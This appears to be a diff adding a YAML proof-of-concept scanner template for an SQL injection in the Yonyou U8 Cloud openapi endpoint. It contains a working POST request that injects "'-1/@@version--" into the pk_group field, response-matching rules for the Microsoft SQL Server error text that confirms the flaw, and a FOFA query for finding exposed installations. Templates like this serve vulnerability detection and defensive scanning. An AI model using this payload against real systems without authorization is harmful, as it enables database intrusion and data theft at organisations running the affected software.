@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-u8-cloud-openapi-sqli
+info:
+  name: 用友U8Cloud openapi SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  paths: 'u8cloud/openapi/ce/paper/query
+
+    u8cloud/openapi/ce.paper.query
+
+    '
+requests:
+- method: POST
+  path: /{{.paths}}?appcode=lbsj&isEncrypt=N
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"paperexecute\": [\n    { \"pk_group\": \"'-1/@@version--\", \"pk_paper\"\
+    : \"1\" }\n  ]\n}"
+  expression: "status_code == 200 && \ncontains(body,\"\\\"status\\\"\\x3a \\\"falied\\\
+    \"\") &&\ncontains(body,\"Microsoft SQL Server\") &&\ncontains(content_type,\"\
+    application/json\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"\
+    在将(.*?)值\")\n"
+transport: http
